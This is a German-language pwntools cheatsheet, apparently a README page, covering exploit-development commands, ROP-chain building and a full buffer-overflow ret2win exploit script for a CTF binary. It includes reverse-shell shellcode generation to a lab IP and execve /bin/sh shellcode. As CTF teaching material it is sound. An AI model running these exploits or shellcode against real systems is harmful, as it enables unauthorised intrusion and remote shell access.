<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# pwntools Cheatsheet

[pwntools](https://github.com/Gallopsled/pwntools) ist ein erstklassiges CTF-Framework und eine in Python geschriebene Exploit-Entwicklungsbibliothek. Es wurde für Rapid Prototyping, binäre Ausnutzung (pwn) und Reverse Engineering entwickelt und bietet eine umfassende Suite von Befehlszeilentools (`pwn cyclic`, `pwn checksec`, `pwn asm`, `pwn shellcraft`) sowie eine High-Level-Python-API für die Interaktion mit lokalen Prozessen und Remote-Sockets.

---

## Inhaltsverzeichnis

- [Kernfähigkeiten](#core-capabilities)
- [Installation](#installation)
- [Befehlszeilen-Dienstprogramme (`pwn <cmd>`)](#command-line-utilities-pwn-cmd)
  - [`pwn cyclic` (Puffer-Offset-Berechnung)](#pwn-symmetric-buffer-offset-calculation)
  - [`pwn checksec` (Minderungsinspektion)](#pwn-checksec-mitigation-inspection)
  - [`pwn asm` & `pwn disasm` (Assembler / Disassembler)](#pwn-asm--pwn-disasm-assembler--disassembler)
  - [`pwn shellcraft` (Shellcode-Generator)](#pwn-shellcraft-shellcode-generator)
  - [`pwn template` (Exploit Skeleton Generator)](#pwn-template-exploit-skeleton-generator)
- [Python-Exploit-Entwicklungsworkflow](#python-exploit-development-workflow)
  - [Prozess- und Remote-Socket-Verbindungen](#process--remote-socket-connections)
  - [ELF-Parsing & Symbole](#elf-parsing--symbols)
  - [ROP-Kettenkonstruktion](#rop-chain-construction)
  - [Packung & Endianness (`p32` / `p64`)](#packing--endianness-p32--p64)
- [Vollständiges Exploit-Beispiel (Pufferüberlauf + ret2win)](#complete-exploit-example-buffer-overflow--ret2win)

---

## Kernkompetenzen

- **Tubes-Architektur:** Einheitliche Schnittstelle für die Interaktion mit lokalen Prozessen (`process`), Remote-TCP-Sockets (`remote`) und SSH-Sitzungen (`ssh`).
- **Binär- und Gadget-Inspektion:** Automatisierte ELF-Symbolauflösung, GOT/PLT-Suche und automatisierte ROP-Kettensynthese.
- **On-the-Fly-Assembly:** Sofortige Übersetzung zwischen Assembly-Mnemoniken und Opcodes über x86, x86_64, ARM, MIPS und AArch64.
- **Shellcode-Synthese:** Vorgefertigte, anpassbare Shellcode-Vorlagen für Reverse-Shells, Execve, Dateilesen und Umgehung.

---

## Installation
```bash
# Ubuntu / Debian / Kali Linux
sudo apt-get update && sudo apt-get install -y python3-pwntools

# Via pip in an isolated Python environment
pip3 install pwntools

# Verify command-line utilities
pwn version
```
---

## Befehlszeilen-Dienstprogramme (`pwn <cmd>`)

### `pwn cyclic` (Puffer-Offset-Berechnung)
Generieren Sie einzigartige zyklische De-Bruijn-Muster, um den genauen Absturzversatz (EIP/RIP-Überschreibung) zu bestimmen:
```bash
# Generate a 200-byte unique pattern
pwn cyclic 200

# Find offset of crashing pattern (e.g. from crash address or register value 0x6161616c)
pwn cyclic -l 0x6161616c
# Output: 44 (offset is exactly 44 bytes to saved instruction pointer)

# 64-bit architecture cyclic pattern lookup
pwn cyclic -l "faaa" -n 8
```
### `pwn checksec` (Minderungsinspektion)
Überprüfen Sie die Sicherheitsmaßnahmen (Canary, NX, PIE, RELRO, ASLR) aller ausführbaren ELF-Dateien:
```bash
pwn checksec /path/to/binary
```
### `pwn asm` & `pwn disasm` (Assembler / Disassembler)
Fügen Sie Anweisungen direkt vom Terminal aus in Shellcode-Bytes zusammen:
```bash
# Assemble x86 instructions to hex bytes
pwn asm "xor eax, eax; push eax"

# Assemble 64-bit shellcode with null-byte output format
pwn asm -c amd64 "mov rax, 59; syscall" --format hex

# Disassemble raw hex bytes back to assembly
pwn disasm "31c050682f2f7368682f62696e89e3505389e1b00bcd80" -c i386
```
### `pwn shellcraft` (Shellcode-Generator)
Generieren Sie produktionsbereite Shellcode-Nutzdaten direkt in Stdout- oder Binärdateien des Terminals:
```bash
# Generate Linux x64 execve /bin/sh shellcode in hex
pwn shellcraft amd64.linux.sh --format hex

# Generate reverse TCP shellcode (IP: 10.10.14.5, Port: 4444)
pwn shellcraft amd64.linux.connect 10.10.14.5 4444

# Output pure raw bytes directly into a file
pwn shellcraft amd64.linux.sh --format raw > shellcode.bin
```
### `pwn template` (Skelettgenerator ausnutzen)
Generieren Sie eine kampferprobte Python-Exploit-Vorlage für einen Ziel-Binär- und Remote-Server:
```bash
pwn template ./vuln_binary --host 10.10.10.100 --port 1337 > exploit.py
```
---

## Python-Exploit-Entwicklungsworkflow

### Prozess- und Remote-Socket-Verbindungen
```python
from pwn import *

# Set target architecture and log level
context.arch = 'amd64'
context.log_level = 'debug'

# Local process execution
io = process('./vuln_binary')

# Or connect to remote CTF instance
# io = remote('10.10.10.100', 1337)

# Send and receive data
io.recvuntil(b'Enter your name: ')
io.sendline(b'Alice')

# Switch to interactive shell once exploit succeeds
io.interactive()
```
### ELF-Parsing und Symbole
Funktionsadressen, GOT- und PLT-Tabellen ohne manuelle GDB-Suche automatisch lesen:
```python
elf = ELF('./vuln_binary')
print(f"Target function address: {hex(elf.symbols['win'])}")
print(f"puts() PLT address: {hex(elf.plt['puts'])}")
print(f"puts() GOT address: {hex(elf.got['puts'])}")
```
### ROP-Kettenkonstruktion
Erstellen Sie automatisch ROP-Ketten (Return-Oriented Programming):
```python
elf = ELF('./vuln_binary')
rop = ROP(elf)

# Call win_function(0x1337, 0xdeadbeef)
rop.win(0x1337, 0xdeadbeef)
print(rop.dump())

payload = b"A" * 40 + rop.chain()
```
### Verpackung und Endianness (`p32` / `p64`)
Konvertieren Sie ganzzahlige Speicheradressen in Little-Endian-Bytes:
```python
# 32-bit little-endian packing
address_32 = p32(0x080484b6)  # Returns b'\xb6\x84\x04\x08'

# 64-bit little-endian packing
address_64 = p64(0x0000000000401156)

# Unpacking bytes to integer
val = u64(b"\x56\x11\x40\x00\x00\x00\x00\x00")
```
---

## Vollständiges Exploit-Beispiel (Pufferüberlauf + ret2win)
```python
#!/usr/bin/env python3
from pwn import *

# Binary configuration
binary_path = './challenge'
context.binary = binary_path
context.log_level = 'info'

elf = ELF(binary_path)

# 1. Start target process or remote connection
if args.REMOTE:
    io = remote('target.ctf.local', 9999)
else:
    io = process(binary_path)

# 2. Craft payload
offset = 40
win_address = elf.symbols['win']

# Include ret gadget for 16-byte stack alignment in Ubuntu 64-bit
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

payload = flat(
    asm('nop') * offset,
    ret_gadget,
    win_address
)

# 3. Deliver payload
io.recvuntil(b'Say something: ')
io.sendline(payload)

# 4. Drop to interactive shell
log.success("Exploit sent! Enjoy your shell:")
io.interactive()
```